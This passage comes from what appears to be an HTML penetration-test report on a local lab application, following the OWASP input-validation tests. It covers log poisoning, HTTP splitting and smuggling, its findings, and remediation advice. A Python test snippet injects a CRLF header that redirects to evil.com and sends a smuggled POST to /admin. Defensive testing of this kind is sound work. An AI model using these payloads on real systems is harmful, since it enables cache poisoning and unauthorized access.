might process user input (like log files)</li>            <li>Inject malicious code into these mechanisms</li>            <li>Trigger processing of the stored data</li>            <li>Check if the injected code is executed</li>        </ol>        <h3>Log Evidence</h3>        <p>The test logs did not show evidence of successful log file poisoning, indicating the application properly sanitizes log entries or doesn't process them in an unsafe manner.</p>    </div>    <div class="test-case">        <h2>OTG-INPVAL-016: Testing for HTTP Splitting/Smuggling</h2>                <h3>Test Objective</h3>        <p>HTTP Splitting/Smuggling testing checks if the application is vulnerable to attacks that manipulate the HTTP protocol to bypass security controls, poison caches, or perform request smuggling.</p>        <p>Key Python snippet used for testing:</p>        <pre><code>def OTG_INPVAL_016(self):    # HTTP Splitting test    payload = "test\r\nLocation: http://evil.com"    response = self.session.get(f"{self.base_url}/vulnerabilities/http_splitting.php?input={payload}")    if "evil.com" in response.headers.get("Location", ""):        self.logger.info("[✓] HTTP Splitting vulnerability found")        # HTTP Smuggling test    smuggled_request = "POST /admin HTTP/1.1\r\nHost: localhost\r\n..."    response = self.session.post(f"{self.base_url}/vulnerabilities/http_smuggling.php",                                 data=smuggled_request,                                 headers={"Content-Length": str(len(smuggled_request))})    if "Admin Panel" in response.text:        self.logger.info("[✓] HTTP Smuggling vulnerability found")</code></pre>        <h3>Target Endpoint</h3>        <p>Primary targets for HTTP Splitting/Smuggling testing:</p>        <ul>            <li>http://localhost:8080/vulnerabilities/http_splitting.php</li>            <li>http://localhost:8080/vulnerabilities/http_smuggling.php</li>        </ul>        <h3>Methodology</h3>        <p>The test attempts to inject CRLF sequences (HTTP Splitting) and crafted HTTP requests (HTTP Smuggling) to manipulate the HTTP protocol. It checks for unexpected redirects or unauthorized access to restricted areas.</p>        <h3>Step to Reproduce</h3>        <ol>            <li>For HTTP Splitting: Inject CRLF sequences followed by malicious headers</li>            <li>For HTTP Smuggling: Send crafted requests with conflicting Content-Length and Transfer-Encoding headers</li>            <li>Monitor responses for unexpected behavior like cache poisoning or unauthorized access</li>            <li>If the attack succeeds, HTTP Splitting/Smuggling vulnerabilities exist</li>        </ol>        <h3>Log Evidence</h3>        <p>The test logs did not show evidence of successful HTTP Splitting or Smuggling attacks, indicating the application properly handles HTTP protocol parsing.</p>    </div>    <div class="section">        <h2>Summary of Findings</h2>        <p>The most critical vulnerabilities discovered in these tests were:</p>        <ul>            <li><strong>Code Injection (LFI/RFI):</strong> The application was vulnerable to Local File Inclusion, allowing access to sensitive system files like /etc/passwd.</li>            <li><strong>Command Injection:</strong> The application allowed execution of arbitrary system commands through vulnerable input parameters.</li>            <li><strong>Buffer Overflow:</strong> The application showed signs of instability when processing large input, indicating potential buffer overflow vulnerabilities.</li>        </ul>        <p>The tests for SSI Injection, XPath Injection, IMAP/SMTP Injection, Incubated Vulnerabilities, and HTTP Splitting/Smuggling did not reveal immediate vulnerabilities, though these areas should still be monitored in future testing.</p>    </div>    <div class="section">        <h2>Recommendations</h2>        <ul>            <li><strong>Input Validation:</strong> Implement strict input validation for all user-supplied data, especially for parameters used in file operations or system commands.</li>            <li><strong>Secure File Operations:</strong> Use whitelists for allowed file paths and disable remote file inclusion if not required.</li>            <li><strong>Command Execution:</strong> Avoid using user input in system commands. If necessary, use parameterized APIs and proper escaping.</li>            <li><strong>Buffer Management:</strong> Ensure proper bounds checking for all input buffers to prevent overflow conditions.</li>            <li><strong>HTTP Protocol Handling:</strong> Continue proper handling of HTTP headers to prevent splitting/smuggling attacks.</li>        </ul>    </div></body></html>